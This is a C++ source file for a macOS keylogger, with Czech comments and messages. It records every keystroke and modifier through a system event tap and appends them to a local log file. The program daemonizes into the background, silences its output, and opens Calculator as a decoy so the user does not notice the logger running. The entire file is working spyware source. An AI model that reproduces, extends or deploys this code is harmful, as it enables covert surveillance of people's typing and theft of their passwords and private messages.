#include <iostream>
#include <ApplicationServices/ApplicationServices.h>
#include <fstream>
#include <string>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <string.h>
#include <stdio.h>

using namespace std;

const char* LOG_FILE = "./log.txt";
const char* OUTPUT_FILE = "/dev/null";


// Function to save keystrokes to a log file
void Save(const string& keyString) {
    ofstream outputFile(LOG_FILE, ios::app);
    if (outputFile.is_open()) {
        outputFile << keyString;
    }
}

string GetKeyString(CGEventRef event) {
    UniChar unicodeChars[4];
    UniCharCount actualStringLength = 0;

    CGEventKeyboardGetUnicodeString(event, 4, &actualStringLength, unicodeChars);
    string result;

    for (int i = 0; i < actualStringLength; ++i) {
        switch (unicodeChars[i]) {
            case 0x011B: result += "ě"; break;
            case 0x0161: result += "š"; break;
            case 0x010D: result += "č"; break;
            case 0x0159: result += "ř"; break;
            case 0x017E: result += "ž"; break;
            case 0x00FD: result += "ý"; break;
            case 0x00E1: result += "á"; break;
            case 0x00ED: result += "í"; break;
            case 0x00E9: result += "é"; break;
            case 0x011A: result += "Ě"; break; 
            case 0x0160: result += "Š"; break;             
            case 0x010C: result += "Č"; break; 
            case 0x0158: result += "Ř"; break; 
            case 0x017D: result += "Ž"; break; 
            case 0x00DD: result += "Ý"; break; 
            case 0x00C1: result += "Á"; break; 
            case 0x00CD: result += "Í"; break; 
            case 0x00C9: result += "É"; break; 
            default: result += unicodeChars[i]; break;
        }
    }

    CGKeyCode keyCode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
    switch (keyCode) {
        case 0x24: result += "[ENTER]"; break;
        case 0x30: result += "[TAB]"; break;
        case 0x31: result += "[SPACE]"; break;
        case 0x33: result += "[DELETE]"; break;
        case 0x35: result += "[ESC]"; break;
        default: break;
    }

    return result;
}

CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void* refcon) {
    if (type != kCGEventKeyDown && type != kCGEventFlagsChanged) return event;

    string keyString;

    CGEventFlags flags = CGEventGetFlags(event);
    if (flags & kCGEventFlagMaskShift) keyString += "[SHIFT] + ";
    if (flags & kCGEventFlagMaskControl) keyString += "[CONTROL] + ";
    if (flags & kCGEventFlagMaskCommand) keyString += "[COMMAND] + ";
    if (flags & kCGEventFlagMaskAlternate) keyString += "[OPTION] + ";
    if (flags & kCGEventFlagMaskAlphaShift) keyString += "[CAPS-LOCK] + ";

    string key = GetKeyString(event);
    if (!key.empty()) {
        keyString += key;
    }

    Save(keyString);
    return event;
}

void RunLogging() {
    CGEventMask eventMask = (1 << kCGEventKeyDown) | (1 << kCGEventFlagsChanged);
    CFMachPortRef eventTap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap,
                                               kCGEventTapOptionDefault, eventMask,
                                               CGEventCallback, NULL);

    if (!eventTap) {
        cerr << "Failed to create event tap!" << endl;
        exit(1);
    }

    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
    CGEventTapEnable(eventTap, true);
    CFRunLoopRun();
}

int main() {
    pid_t pid = fork();

    if (pid < 0) {
        cerr << "Fork failed!" << endl;
        return 1;
    }

    // Parent process
    if (pid > 0) {
        system("open -a Calculator");
        cout << "Keylogger běží na pozadí s PID: " << pid << endl;
        return 0;
    }

    // Child process
    umask(0);
    pid_t sid = setsid();
    if (sid < 0) {
        cerr << "Chyba při setsid!" << endl;
        return 1;
    }


  
    // Redirect standard input/output/error to /dev/null to make the process quiet
    freopen(OUTPUT_FILE, "r", stdin);
    freopen(OUTPUT_FILE, "w", stdout);
    freopen(OUTPUT_FILE, "w", stderr);
    
    // Run the keylogger
    RunLogging();

    return 0;
}